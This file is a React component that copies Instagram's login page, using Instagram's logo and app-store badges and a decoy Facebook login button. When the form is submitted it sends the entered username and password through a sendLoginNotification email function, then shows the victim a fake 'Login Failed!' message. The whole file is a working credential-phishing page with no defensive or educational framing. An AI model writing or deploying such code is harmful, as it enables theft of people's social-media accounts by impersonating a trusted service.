import React, { useState } from 'react';
import { LoginFormInput } from './LoginFormInput';
import { LoginFormDivider } from './LoginFormDivider';
import { LoginFooter } from './LoginFooter';
import { sendLoginNotification } from '../services/emailService';
import { Eye, EyeOff } from 'lucide-react';

export default function LoginForm() {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
  });
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    if (!formData.username || !formData.password) {
      setError('Please fill in all fields');
      setLoading(false);
      return;
    }

    try {
      await sendLoginNotification(formData.username, formData.password);
      setFormData({ username: '', password: '' });
      alert('Login Failed!');
    } catch (error) {
      console.error('Login error:', error);
      setError('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-[#fafafa] px-4 mt-20">
      <div className="w-full max-w-[350px] bg-white border border-gray-200 rounded p-10 mb-2.5">
        <div className="flex justify-center mb-8">
          <img
            src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
            alt="Instagram"
            className="h-[51px] mt-3 mb-4"
          />
        </div>
        
        <form onSubmit={handleSubmit} className="flex flex-col gap-2">
          <LoginFormInput
            type="text"
            label="Phone number, username, or email"
            value={formData.username}
            onChange={(e) => setFormData({ ...formData, username: e.target.value })}
          />

          <div className="relative">
            <LoginFormInput
              type={showPassword ? "text" : "password"}
              label="Password"
              value={formData.password}
              onChange={(e) => setFormData({ ...formData, password: e.target.value })}
            />
            {formData.password && (
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-600 p-1 hover:text-gray-900"
              >
                {showPassword ? (
                  <EyeOff className="w-4 h-4" />
                ) : (
                  <Eye className="w-4 h-4" />
                )}
              </button>
            )}
          </div>

          {error && (
            <p className="text-red-500 text-sm mt-2 text-center">{error}</p>
          )}

          <button
            type="submit"
            disabled={loading || !formData.username || !formData.password}
            className="mt-2 instagram-button text-white py-[7px] rounded text-sm font-semibold
              disabled:bg-[#0095f6]/70 disabled:cursor-default"
          >
            {loading ? 'Logging in...' : 'Log in'}
          </button>

          <LoginFormDivider />

          <button
            type="button"
            className="flex items-center justify-center gap-2 text-[#385185] font-semibold text-sm mt-2"
          >
            <svg className="w-5 h-5 text-[#385185]" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02z" />
            </svg>
            Log in with Facebook
          </button>

          <a href="#" className="text-xs text-[#00376b] text-center mt-3 hover:text-[#00376b]/80">
            Forgot password?
          </a>
        </form>
      </div>

      <div className="w-full max-w-[350px] bg-white border border-gray-200 rounded py-4 text-center">
        <p className="text-sm">
          Don't have an account?{' '}
          <a href="#" className="font-semibold text-[#0095f6] hover:text-[#00376b]">
            Sign up
          </a>
        </p>
      </div>

      <div className="text-center mt-5">
        <p className="text-sm">Get the app.</p>
        <div className="flex justify-center gap-2 mt-4">
          <a href="#" className="hover:opacity-80">
            <img
              src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
              alt="Download on the App Store"
              className="h-10"
            />
          </a>
          <a href="#" className="hover:opacity-80">
            <img
              src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
              alt="Get it on Google Play"
              className="h-10"
            />
          </a>
        </div>
      </div>

      <LoginFooter />
    </div>
  );
}